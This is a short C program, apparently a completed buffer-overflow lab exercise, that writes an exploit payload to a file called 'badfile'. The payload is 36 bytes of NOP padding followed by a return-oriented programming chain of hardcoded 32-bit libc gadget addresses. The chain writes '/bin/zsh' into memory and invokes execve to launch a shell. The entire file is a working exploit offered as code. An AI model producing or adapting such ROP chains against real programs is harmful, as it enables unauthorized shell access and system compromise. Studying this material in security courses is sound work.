/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char ropchain[]=
    "\xa2\x7d\xbc\xb7"  /* pop ecx ; pop ebx ;; */
    "\x28\xa0\x04\x08"  /* 0x0804a028 .dat */
    "\x2f\x62\x69\x6e"  /* /bin */
    "\x56\xf1\xbc\xb7"  /* pop eax ;; */
    "\x2f\x62\x69\x6e"  /* /bin */
    "\xbf\x55\xbc\xb7"  /* mov [ecx] eax ; xor eax eax ;;*/

    "\xa2\x7d\xbc\xb7"  /* pop ecx ; pop ebx ;; */
    "\x2c\xa0\x04\x08"  /* 0x0804a028+0x4 .dat*/
    "\x2f\x7a\x73\x68"  /* /zsh */
    "\x56\xf1\xbc\xb7"  /* pop eax ;; */
    "\x2f\x7a\x73\x68"  /* /zsh */
    "\xbf\x55\xbc\xb7"  /* mov [ecx] eax ; xor eax eax ;;*/

    "\xa2\x7d\xbc\xb7"  /* pop ecx ; pop ebx ;; */
    "\x20\xa0\x04\x08"  /* 0x0804a020 .dat */
    "\x2f\x62\x69\x6e"  /* /bin */
    "\x56\xf1\xbc\xb7"  /* pop eax ;; */
    "\x28\xa0\x04\x08"  /* 0x0804a028 .dat */
    "\xbf\x55\xbc\xb7"  /* mov [ecx] eax ; xor eax eax ;;*/

    "\xa2\x7d\xbc\xb7"  /* pop ecx ; pop ebx ;; */
    "\x24\xa0\x04\x08"  /* 0x0804a020+0x8 .dat */
    "\x28\xa0\x04\x08"  /* 0x0804a020+0x8 .dat */
    "\xbf\x55\xbc\xb7"  /* mov [ecx] eax ; xor eax eax ;;*/

    "\xa2\x7d\xbc\xb7"  /* pop ecx ; pop ebx ;; */
    "\x30\xa0\x04\x08"  /* 0x0804a020+0x8 .dat */
    "\x28\xa0\x04\x08"  /* 0x0804a020+0x8 .dat */
    "\xbf\x55\xbc\xb7"  /* mov [ecx] eax ; xor eax eax ;;*/

    "\x1e\xc6\xbc\xb7"  /* pop ecx ;; */
    "\x20\xa0\x04\x08"  /* 0x0804a020+0x8 .dat */
    "\x32\x29\xe5\xb7"  /* mov edx 0x0 ; cmovb eax edx ;; */
    "\x9f\xd3\xbb\xb7"  /*  pop ebx ;;  */
    "\x28\xa0\x04\x08"  /* 0x0804a020 .dat */
    "\x9c\x9b\xea\xb7"  /* add eax 0x4 */
    "\x3f\x9b\xea\xb7"  /* add eax 0x7 */
    "\xf5\xb0\xe1\xb7"  /* call dword [gs:0x10] ;  ;;*/
;

void main(int argc, char **argv)
{
    char *buffer;
    FILE *badfile;
    int bufsize = sizeof(ropchain)+36;
    buffer = malloc(bufsize);

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, bufsize);

    /* You need to fill the buffer with appropriate contents here */
    memcpy(buffer+36, ropchain, sizeof(ropchain));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, bufsize, 1, badfile);
    fclose(badfile);
    free(buffer);
}

